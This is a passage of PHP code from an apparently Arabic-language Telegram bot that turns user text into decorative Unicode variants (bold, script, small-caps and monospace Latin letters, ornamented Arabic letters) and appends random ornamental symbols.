file_put_contents("zkrf.txt","zkrf");
bot('EditMessageText',[
'chat_id'=>$f_ppp2,
'message_id'=>$php_aba_id2,
'text'=>"*حسنا ارسل ما تريد زخرفته 💞🌻*",
'parse_mode'=>"MarkDown",
]);   
}
if($text != "/start"   and $zkrf == "zkrf"){
file_put_contents("zkrf.txt","none");
$items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text); 
$ok = str_replace('a','𝐴',$text); 
 $ok = str_replace('b','b',$ok); 
 $ok = str_replace('c','𝐶',$ok); 
 $ok = str_replace('d','𝐷',$ok); 
 $ok = str_replace('e','𝐸',$ok); 
 $ok = str_replace('f','𝐹',$ok); 
 $ok = str_replace('g','𝐺',$ok); 
 $ok = str_replace('h','𝐻',$ok); 
 $ok = str_replace('i','𝐼',$ok); 
 $ok = str_replace('j','𝐽',$ok); 
 $ok = str_replace('k','𝐾',$ok); 
 $ok = str_replace('l','𝐿',$ok); 
 $ok = str_replace('m','𝑀',$ok); 
 $ok = str_replace('n','𝑁',$ok); 
 $ok = str_replace('o','𝑂',$ok); 
 $ok = str_replace('p','𝑃',$ok); 
 $ok = str_replace('q','𝑄',$ok); 
 $ok = str_replace('r','𝑅',$ok); 
 $ok = str_replace('s','𝑆',$ok); 
 $ok = str_replace('t','𝑇',$ok); 
 $ok = str_replace('u','𝐔',$ok); 
 $ok = str_replace('v','𝑉',$ok); 
 $ok = str_replace('w','𝑊',$ok); 
 $ok = str_replace('x','𝑋',$ok); 
 $ok = str_replace('y','𝑌',$ok); 
 $ok = str_replace('z','𝑍',$ok);
 $ok = str_replace('ض','ض֮',$ok);
$ok = str_replace('ص','ص֓',$ok); 
$ok = str_replace('ث','ثֻ',$ok); 
$ok = str_replace('ق','ق֯',$ok); 
$ok = str_replace('ف','ف֛',$ok); 
$ok = str_replace('غ','غؒ',$ok); 
$ok = str_replace('ع','عٌ',$ok); 
$ok = str_replace('ه','هٞ',$ok); 
$ok = str_replace('خ','خ٘٘٘٘٘٘٘٘٘٘',$ok); 
$ok = str_replace('ح','حٟ',$ok); 
$ok = str_replace('ج','جۤ',$ok); 
$ok = str_replace('ش','شۨ',$ok);
$ok = str_replace('س','سܱܰ',$ok); 
$ok = str_replace('ي','يަ',$ok); 
$ok = str_replace('ب','ب߬',$ok); 
$ok = str_replace('ل','ل',$ok); 
$ok = str_replace('ا','اࠗ',$ok); 
$ok = str_replace('ت','ت',$ok); 
$ok = str_replace('ن','نۨۨۨۨۨۨۨۨ',$ok); 
$ok = str_replace('م','مࣩ',$ok); 
$ok = str_replace('ك','ك๊',$ok); 
$ok = str_replace('ظ','ظ້',$ok); 
$ok = str_replace('ط','ط็',$ok); 
$ok = str_replace('ذ','ذྃ',$ok); 
$ok = str_replace('ء','ء',$ok); 
$ok = str_replace('ؤ','ؤ',$ok); 
$ok = str_replace('ر','ر',$ok); 
$ok = str_replace('ى','ى',$ok); 
$ok = str_replace('ة','ة',$ok); 
$ok = str_replace('و','୨و',$ok); 
$ok = str_replace('ز','ز',$ok); 
$ok = str_replace('ظ',' ظ',$ok); 
$ok = str_replace('د','د',$ok); 
$a = $ok."".$smile;
$aa = $ok."".$smile;
$items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗']; 
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text); 
$ok = str_replace('a',"𝓪",$text);
$ok = str_replace('A',"𝓐",$ok);
$ok = str_replace("b","𝓫",$ok);
$ok = str_replace("B","𝓑",$ok);
$ok = str_replace("c","𝓬",$ok);
$ok = str_replace("C","𝓒",$ok);
$ok = str_replace("d","𝓭",$ok);
$ok = str_replace("D","𝓓",$ok);
$ok = str_replace("e","𝓮",$ok);
$ok = str_replace("E","𝓔",$ok);
$ok = str_replace("f","𝓯",$ok);
$ok = str_replace("F","𝓕",$ok);
$ok = str_replace("g","𝓰",$ok);
$ok = str_replace("G","𝓖",$ok);
$ok = str_replace("h","𝓱",$ok);
$ok = str_replace("H","𝓗",$ok);
$ok = str_replace("i","𝓲",$ok);
$ok = str_replace("I","𝓘",$ok);
$ok = str_replace("j","𝓳",$ok);
$ok = str_replace("J","𝓙",$ok);
$ok = str_replace("k","𝓴",$ok);
$ok = str_replace("K","𝓚",$ok);
$ok = str_replace("l","𝓵",$ok);
$ok = str_replace("L","𝓛",$ok);
$ok = str_replace("m","𝓶",$ok);
$ok = str_replace("M","𝓜",$ok);
$ok = str_replace("n","𝓷",$ok);
$ok = str_replace("N","𝓝",$ok);
$ok = str_replace("o","𝓸",$ok);
$ok = str_replace("O","𝓞",$ok);
$ok = str_replace("p","𝓹",$ok);
$ok = str_replace("P","𝓟",$ok);
$ok = str_replace("q","𝓺",$ok);
$ok = str_replace("Q","𝓠",$ok);
$ok = str_replace("r","𝓻",$ok);
$ok = str_replace("R","𝓡",$ok);
$ok = str_replace("s","𝓼",$ok);
$ok = str_replace("S","𝓢",$ok);
$ok = str_replace("t","𝓽",$ok);
$ok = str_replace("T","𝓣",$ok);
$ok = str_replace("u","𝓾",$ok);
$ok = str_replace("U","𝓤",$ok);
$ok = str_replace("v","𝓿",$ok);
$ok = str_replace("V","𝓥",$ok);
$ok = str_replace("w","𝔀",$ok);
$ok = str_replace("W","𝓦",$ok);
$ok = str_replace("x","𝔁",$ok);
$ok = str_replace("X","𝓧",$ok);
$ok = str_replace("y","𝔂",$ok);
$ok = str_replace("Y","𝓨",$ok);
$ok = str_replace("z","𝔃",$ok);
$ok = str_replace("Z","𝓩",$ok);
$ok = str_replace('ض','ضّ',$ok);
$ok = str_replace('ص','صٌ',$ok); 
$ok = str_replace('ث','ثّ',$ok); 
$ok = str_replace('ق','قِ',$ok); 
$ok = str_replace('ف','فِّ',$ok); 
$ok = str_replace('غ','غٌ',$ok); 
$ok = str_replace('ع','عٌ',$ok); 
$ok = str_replace('ه','هِ',$ok); 
$ok = str_replace('خ','خَ',$ok); 
$ok = str_replace('ح','حٌ',$ok); 
$ok = str_replace('ج','جِ',$ok); 
$ok = str_replace('ش','شٍ',$ok); 
$ok = str_replace('س',' س',$ok); 
$ok = str_replace('ي','يِّ',$ok); 
$ok = str_replace('ب','بِ',$ok);
$ok = str_replace('ل','لَ',$ok); 
$ok = str_replace('ا','أّ',$ok); 
$ok = str_replace('ت','تّ',$ok); 
$ok = str_replace('ن','نِ',$ok); 
$ok = str_replace('ك','ګ',$ok); 
$ok = str_replace('م','مَ',$ok); 
$ok = str_replace('ة',' ةّ',$ok); 
$ok = str_replace('ء','ء',$ok); 
$ok = str_replace('ظ','ظّ',$ok); 
$ok = str_replace('ط','طّ',$ok); 
 $ok = str_replace('ذ','ذّ',$ok); 
$ok = str_replace('د','دِ',$ok); 
$ok = str_replace('ز','زِّ',$ok); 
$ok = str_replace('ر','ڒٍ',$ok); 
$ok = str_replace('و','وِ',$ok); 
$ok = str_replace('ى','ىّ',$ok);
$b = $ok.''.$smile;
$items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text);
$ok = str_replace('a','𝙰',$text);
$ok = str_replace("b","𝙱",$ok);
$ok = str_replace("c","𝙲",$ok);
$ok = str_replace("d","𝙳",$ok);
$ok = str_replace("e","𝙴",$ok);
$ok = str_replace("E","𝙵",$ok);
$ok = str_replace("g","𝙶",$ok);
$ok = str_replace("h","𝙷",$ok);
$ok = str_replace("i","𝙸",$ok);
$ok = str_replace("j","𝙹",$ok);
$ok = str_replace("k","𝙺",$ok);
$ok = str_replace("l","𝙻",$ok);
$ok = str_replace("m","𝙼",$ok);
$ok = str_replace("n","𝙽",$ok);
$ok = str_replace("o","𝙾",$ok);
$ok = str_replace("p","𝙿",$ok);
$ok = str_replace("q","𝚀",$ok);
$ok = str_replace("r","𝚁",$ok);
$ok = str_replace("s","𝚂",$ok);
$ok = str_replace("t","𝚃",$ok);
$ok = str_replace("u","𝚄",$ok);
$ok = str_replace("v","𝚅",$ok);
$ok = str_replace("w","𝚆",$ok);
$ok = str_replace("x","𝚇",$ok);
$ok = str_replace("y","𝚈",$ok);
$ok = str_replace("z","𝚉",$ok);
$ok = str_replace('ض','ضّ',$ok);
$ok = str_replace('ص','صٌ',$ok); 
$ok = str_replace('ث','ثّ',$ok); 
$ok = str_replace('ق','قᮭ',$ok); 
$ok = str_replace('ف','ف᭫ᮥ',$ok); 
$ok = str_replace('غ','غٌ',$ok); 
$ok = str_replace('ع','عٌ',$ok); 
$ok = str_replace('ه','هِ',$ok); 
$ok = str_replace('خ','خ᪳᪲',$ok); 
$ok = str_replace('ح','ح᪽',$ok); 
$ok = str_replace('ج','ج᪷᪹',$ok); 
$ok = str_replace('ش','شٍ',$ok); 
$ok = str_replace('س',' َّس',$ok); 
$ok = str_replace('ي','ي᪸᪰',$ok); 
$ok = str_replace('ب','بᤠ',$ok);
$ok = str_replace('ل','لཻ',$ok); 
$ok = str_replace('ا','اི',$ok); 
$ok = str_replace('ت','تّ',$ok); 
$ok = str_replace('ن','ن྄༹',$ok); 
$ok = str_replace('ك','كิ',$ok); 
$ok = str_replace('م','مຼ',$ok); 
$ok = str_replace('ة',' ةّ',$ok); 
$ok = str_replace('ء','ء',$ok); 
$ok = str_replace('ظ','ظܱܰ',$ok); 
$ok = str_replace('ط','ط์',$ok); 
 $ok = str_replace('ذ','ذٍُ',$ok); 
$ok = str_replace('د','دّ',$ok); 
$ok = str_replace('ز','زٌِ',$ok); 
$ok = str_replace('ر','رٰ',$ok); 
$ok = str_replace('و','وٰ໑ٰ',$ok); 
$ok = str_replace('ى','ىّ',$ok);
$c = $ok.''.$smile;
$items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text); 
$ok = str_replace('a','ᴀ',$text); 
 $ok = str_replace('b','ʙ',$ok); 
 $ok = str_replace('c','ᴄ',$ok); 
 $ok = str_replace('d','ᴅ',$ok); 
 $ok = str_replace('e','ᴇ',$ok); 
 $ok = str_replace('f','ғ',$ok); 
 $ok = str_replace('g','ɢ',$ok); 
 $ok = str_replace('h','ʜ',$ok); 
 $ok = str_replace('i','ɪ',$ok); 
 $ok = str_replace('j','ᴊ',$ok); 
 $ok = str_replace('k','ᴋ',$ok); 
 $ok = str_replace('l','ʟ',$ok); 
 $ok = str_replace('m','ᴍ',$ok); 
 $ok = str_replace('n','ɴ',$ok); 
 $ok = str_replace('o','ᴏ',$ok); 
 $ok = str_replace('p','ᴘ',$ok); 
 $ok = str_replace('q','ǫ',$ok); 
 $ok = str_replace('r','ʀ',$ok); 
 $ok = str_replace('s','s',$ok); 
 $ok = str_replace('t','ᴛ',$ok); 
 $ok = str_replace('u','ᴜ',$ok); 
 $ok = str_replace('v','ᴠ',$ok); 
 $ok = str_replace('w','ᴡ',$ok); 
 $ok = str_replace('x','x',$ok); 
 $ok = str_replace('y','ʏ',$ok); 
 $ok = str_replace('z','ᴢ',$ok);
 $ok = str_replace('ض','ضُ',$ok);
$ok = str_replace('ص','صّ',$ok); 
$ok = str_replace('ث','ثُ',$ok); 
$ok = str_replace('ق','قً',$ok); 
$ok = str_replace('ف','فَ',$ok); 
$ok = str_replace('غ','غً',$ok); 
$ok = str_replace('ع','ْع ',$ok); 
$ok = str_replace('ه','هہ',$ok); 
$ok = str_replace('خ','خہ',$ok); 
$ok = str_replace('ح','حہ',$ok); 
$ok = str_replace('ج','جہ',$ok); 
$ok = str_replace('ش','شہ',$ok); 
$ok = str_replace('س',' سہ',$ok); 
$ok = str_replace('ي','يہ',$ok); 
$ok = str_replace('ب','بہ',$ok);
$ok = str_replace('ل','لَ',$ok); 
$ok = str_replace('ا','آ',$ok); 
$ok = str_replace('ت','تہ',$ok); 
$ok = str_replace('ن','نہ',$ok); 
$ok = str_replace('ك','كہ',$ok); 
$ok = str_replace('م','مہ',$ok); 
$ok = str_replace('ة',' ةّ',$ok); 
$ok = str_replace('ء','ء',$ok); 
$ok = str_replace('ظ','ظہ',$ok); 
$ok = str_replace('ط','طہ',$ok); 
 $ok = str_replace('ذ','ذّ',$ok); 
$ok = str_replace('د','دِ',$ok); 
$ok = str_replace('ز','زِّ',$ok); 
$ok = str_replace('ر','ڒٍ',$ok); 
$ok = str_replace('و','وِ',$ok); 
$ok = str_replace('ى','ىّ',$ok);
 $d = $ok."".$smile;

 $items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text);
$ok = str_replace('a','𝘼',$text); 
 $ok = str_replace('b','𝘽',$ok); 
 $ok = str_replace('c','𝘾',$ok); 
 $ok = str_replace('d','𝘿',$ok); 
 $ok = str_replace('e','𝙀',$ok); 
 $ok = str_replace('f','𝙁',$ok); 
 $ok = str_replace('g','𝙂',$ok); 
 $ok = str_replace('h','𝙃',$ok); 
 $ok = str_replace('i','𝙄',$ok); 
 $ok = str_replace('j','𝙅',$ok); 
 $ok = str_replace('k','𝙆',$ok); 
 $ok = str_replace('l','𝙇',$ok); 
 $ok = str_replace('m','𝙈',$ok); 
 $ok = str_replace('n','𝙉',$ok); 
 $ok = str_replace('o','𝙊',$ok); 
 $ok = str_replace('p','𝙋',$ok); 
 $ok = str_replace('q','𝙌',$ok); 
 $ok = str_replace('r','𝙍',$ok); 
 $ok = str_replace('s','𝙎',$ok); 
 $ok = str_replace('t','𝙏',$ok); 
 $ok = str_replace('u','𝙐',$ok); 
 $ok = str_replace('v','𝙑',$ok); 
 $ok = str_replace('w','𝙒',$ok); 
 $ok = str_replace('x','𝙓',$ok); 
 $ok = str_replace('y','𝙔',$ok); 
 $ok = str_replace('z','𝙕',$ok);
 $ok = str_replace('ض','᎗ᘞ̇',$ok);
$ok = str_replace('ص',' ᎗ᘗ',$ok); 
$ok = str_replace('ث','᎗̇̈ɹ ',$ok); 
$ok = str_replace('ق','',$ok); 
$ok = str_replace('ف','',$ok); 
$ok = str_replace('غ','᎗ϛ',$ok); 
$ok = str_replace('ع','᎗ჺ',$ok); 
$ok = str_replace('ه','᎗බ',$ok); 
$ok = str_replace('خ','ᓘ',$ok); 
$ok = str_replace('ح','ᓗ',$ok); 
$ok = str_replace('ج','ᓗฺ',$ok); 
$ok = str_replace('س',' ᎗ɹɹɹ',$ok); 
$ok = str_replace('ش','᎗ɹ̇̈ɹɹ',$ok); 
$ok = str_replace('ي',' ᎗̤ɹ',$ok); 
$ok = str_replace('ب','᎗̣ɹ ',$ok);
$ok = str_replace('ل','⅃',$ok); 
$ok = str_replace('ا','Ȋ',$ok); 
$ok = str_replace('ت','᎗̈ɹ',$ok); 
$ok = str_replace('ن','᎗̇ɹ',$ok); 
$ok = str_replace('ك','ܭ',$ok); 
$ok = str_replace('م','ᓄ',$ok); 
$ok = str_replace('ة',' ᎗Ꭷ',$ok); 
$ok = str_replace('ء','ء',$ok); 
$ok = str_replace('ظ','᎗̇Ь',$ok); 
$ok = str_replace('ط','᎗Ь',$ok); 
 $ok = str_replace('ذ','ذّ',$ok); 
$ok = str_replace('د','ↄ',$ok); 
$ok = str_replace('ز','j',$ok); 
$ok = str_replace('ر','ڒٍ',$ok); 
$ok = str_replace('و','g',$ok); 
$ok = str_replace('ى','ىّ',$ok);
 $e = $ok.''.$smile;
$items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text);
$ok = str_replace('a','𝒂',$text); 
 $ok = str_replace('b','𝒃',$ok); 
 $ok = str_replace('c','𝒄',$ok); 
 $ok = str_replace('d','𝒅',$ok); 
 $ok = str_replace('e','𝒆',$ok); 
 $ok = str_replace('f','𝒇',$ok); 
 $ok = str_replace('g','𝒈',$ok); 
 $ok = str_replace('h','𝒉',$ok); 
 $ok = str_replace('i','𝒊',$ok); 
 $ok = str_replace('j','𝒋',$ok); 
 $ok = str_replace('k','𝒌',$ok); 
 $ok = str_replace('l','𝒍',$ok); 
 $ok = str_replace('m','𝒎',$ok); 
 $ok = str_replace('n','𝒏',$ok); 
 $ok = str_replace('o','𝒐',$ok); 
 $ok = str_replace('p','𝒑',$ok); 
 $ok = str_replace('q','𝒒',$ok); 
 $ok = str_replace('r','𝒓',$ok); 
 $ok = str_replace('s','𝒔',$ok); 
 $ok = str_replace('t','𝒕',$ok); 
 $ok = str_replace('u','𝒖',$ok); 
 $ok = str_replace('v','𝒗',$ok); 
 $ok = str_replace('w','𝒘',$ok); 
 $ok = str_replace('x','𝒙',$ok); 
 $ok = str_replace('y','𝒚',$ok); 
 $ok = str_replace('z','𝒛',$ok);
 $ok = str_replace('ا','ا',$ok);
$ok = str_replace('ص','صـٌٍ๋ۤ͜ﮧْ',$ok); 
$ok = str_replace('ث','ث̲ꫭـﮧ',$ok); 
$ok = str_replace('ق','قٰٰྀ̲ـِٰ̲ﮧْ',$ok); 
$ok = str_replace('ف','فـٌٍ๋ۤ͜ﮧ',$ok); 
$ok = str_replace('غ','غـّٰ̐ہٰٰ',$ok); 
$ok = str_replace('ع','عٌ',$ok); 
$ok = str_replace('ه','ھہ',$ok); 
$ok = str_replace('خ','خ̲ﮧ',$ok); 
$ok = str_replace('ح','ح̲ꪳـﮧ',$ok); 
$ok = str_replace('ج','ج̲ꪸـﮧ',$ok); 
$ok = str_replace('ش','ش̲ꪾـﮧ',$ok); 
$ok = str_replace('س','سـ̷ٰٰﮧْ',$ok); 
$ok = str_replace('ي','يـِٰ̲ﮧ',$ok); 
$ok = str_replace('ب','ب̲ꪰـﮧْ',$ok);
$ok = str_replace('ل','لٍُـّٰ̐ہ',$ok); 
$ok = str_replace('ا','أّ',$ok); 
$ok = str_replace('ت','تـٰۧﮧ',$ok); 
$ok = str_replace('ن','نٰ̲̐ـﮧْ',$ok); 
$ok = str_replace('ك','كـِّﮧْٰٖ',$ok); 
$ok = str_replace('م','مٰٰྀ̲ـِٰ̲ﮧْ',$ok); 
$ok = str_replace('ة',' ةً',$ok); 
$ok = str_replace('ء','ء',$ok); 
$ok = str_replace('ظ','ظَـ๋͜ﮧْ',$ok); 
$ok = str_replace('ط','ط̲꫁ـﮧ',$ok); 
 $ok = str_replace('ذ','ذٖ',$ok); 
$ok = str_replace('د','دُ',$ok); 
$ok = str_replace('ز','ژٰ',$ok); 
$ok = str_replace('ر','ڒٍ',$ok); 
$ok = str_replace('و','ﯛ૭',$ok); 
$ok = str_replace('ى','ىّ',$ok);
 $f = $ok.''.$smile;
 $items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text);
$ok = str_replace('a','𝐀',$text);
$ok = str_replace("b","𝐁",$ok);
$ok = str_replace("c","𝐂",$ok);
$ok = str_replace("d","𝐃",$ok);
$ok = str_replace("e","𝐄",$ok);
$ok = str_replace("E","𝐅",$ok);
$ok = str_replace("g","𝐆",$ok);
$ok = str_replace("h","𝐇",$ok);
$ok = str_replace("i","𝐈",$ok);
$ok = str_replace("j","𝐉",$ok);
$ok = str_replace("k","𝐊",$ok);
$ok = str_replace("l","𝑳",$ok);
$ok = str_replace("m","𝐌",$ok);
$ok = str_replace("n","𝐍",$ok);
$ok = str_replace("o","𝐎",$ok);
$ok = str_replace("p","𝐏",$ok);
$ok = str_replace("q","𝐐",$ok);
$ok = str_replace("r","𝐑",$ok);
$ok = str_replace("s","𝐒",$ok);
$ok = str_replace("t","𝐓",$ok);
$ok = str_replace("u","𝐔",$ok);
$ok = str_replace("v","𝐕",$ok);
$ok = str_replace("w","𝐖",$ok);
$ok = str_replace("x","𝐗",$ok);
$ok = str_replace("y","𝐘",$ok);
$ok = str_replace("z","𝐙",$ok);
 $ok = str_replace('ض','ضــٰـُ͢ـًُــ ',$ok); 
$ok = str_replace('ص','صــٰـُ͢ـُٰཻــ͒͜ـًـــ',$ok); 
$ok = str_replace('ث','ث',$ok); 
$ok = str_replace('ق','قٰཻ͚͆ـــــ͒͜ـً',$ok); 
$ok = str_replace('ف','ف',$ok); 
$ok = str_replace('غ','غــٰـُ͢ـُـ̷ِْــٰــ',$ok); 
$ok = str_replace('ع','ع',$ok); 
$ok = str_replace('ه','هہ',$ok); 
$ok = str_replace('خ','خـٰٰٰٖٖٖۧـ๋͜ــ۫͜ـــ',$ok); 
$ok = str_replace('ح','حـ̷ِْــٰــ۫͜ـــ',$ok); 
$ok = str_replace('ج','جـ',$ok); 
$ok = str_replace('ش','شـ๋๋͜͜͡‏ــٰـُ͢ـُٰཻـــ',$ok); 
$ok = str_replace('س','سـٰٰٰٖٖٖۧـ๋͜ــــ',$ok); 
$ok = str_replace('ي','ي',$ok); 
$ok = str_replace('ب','بــ',$ok);
$ok = str_replace('ل','ݪ',$ok); 
$ok = str_replace('ا','آ',$ok); 
$ok = str_replace('ت','تـَٰــۘ❀ـَٰـ',$ok); 
$ok = str_replace('ن','ن',$ok); 
$ok = str_replace('م','مـ',$ok); 
$ok = str_replace('ك','ڪ',$ok); 
$ok = str_replace('ة','ةً',$ok); 
$ok = str_replace('ء','ء',$ok); 
$ok = str_replace('ظ','ظــٰـُ͢ـًُــ',$ok); 
$ok = str_replace('ط','طــ',$ok); 
 $ok = str_replace('ذ','ذِ',$ok); 
$ok = str_replace('د','دٰ',$ok); 
$ok = str_replace('ز','زً',$ok); 
$ok = str_replace('ر','ر',$ok); 
$ok = str_replace('و','و',$ok); 
 $ok = str_replace('ى','ىٰ',$ok);
$g = $ok.''.$smile;
 $items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text);
$ok = str_replace('a','𝗔',$text);
$ok = str_replace("b","𝗕",$ok);
$ok = str_replace("c","𝗖",$ok);
$ok = str_replace("d","𝗗",$ok);
$ok = str_replace("e","𝗘",$ok);
$ok = str_replace("E","𝗙",$ok);
